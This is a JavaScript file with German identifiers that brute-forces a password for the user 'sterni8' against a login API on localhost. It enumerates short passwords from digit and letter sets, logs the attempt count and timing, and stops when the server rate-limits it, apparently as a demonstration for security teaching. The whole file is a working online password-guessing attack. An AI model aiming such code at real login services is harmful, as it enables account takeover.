"use strict";

const MONO_CHARSETS = {
    digits: "0123456789",
    lowercase: "abcdefghijklmnopqrstuvwxyz",
    uppercase: "ABCDEFGHIJKLMNOPQRSTUVWXYZ",
}

async function login(nutzer, password) {
  const response = await fetch("http://localhost:3000/api/auth/login", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      username: nutzer,
      password: password,
    }),
  });

  if (response.status === 429) {
    throw new Error("Rate limit exceeded. Please try again later.");
  }
  return response.status === 200;
}

function* kombinationen(zeichensatz, laenge) {
  if (laenge === 0) {
    yield "";
    return;
  }

  for (const zeichen of zeichensatz) {
    for (const rest of kombinationen(zeichensatz, laenge - 1)) {
      yield zeichen + rest;
    }
  }
}

async function bruteForceMono(nutzer, zeichensatz, maxLaenge) {
  let versuche = 0;

  for (let laenge = 1; laenge <= maxLaenge; laenge++) {
    for (const versuch of kombinationen(zeichensatz, laenge)) {
      versuche++;
      try {
        if (await login(nutzer, versuch)) {
          return { gefunden: versuch, versuche };
        }
      } catch (error) {
          if (error.message.includes("Rate limit exceeded")) {
              console.error("Rate limit exceeded. Please try again later.");
              process.exit(1);
          }
          throw error;
      }
    }
  }

  return { gefunden: null, versuche };
}

async function main() {
    const nutzer = "sterni8"

    for (const [name, zeichensatz] of Object.entries(MONO_CHARSETS)) {
        console.log(`\nAngriff mit Zeichensatz: ${name} (${zeichensatz})`);
        const start = Date.now();
        const {gefunden, versuche} = await bruteForceMono(nutzer, zeichensatz, 3);
        const dauerSekunden = (Date.now() - start) / 1000;

        console.log(`Angriffsziel:      username="${nutzer}"`);
        console.log(`Passwort gefunden: ${gefunden}`);
        console.log(`Anzahl Versuche:   ${versuche}`);
        console.log(`Dauer:             ${dauerSekunden.toFixed(3)} Sekunden`);

        if (gefunden) {
            console.log(`Erfolgreich! Das Passwort für den Nutzer "${nutzer}" ist: ${gefunden}`);
            return;
        }
    }

    console.log("\n--- Angriff abgeschlossen ---");
}

if (require.main === module) {
  main();
}
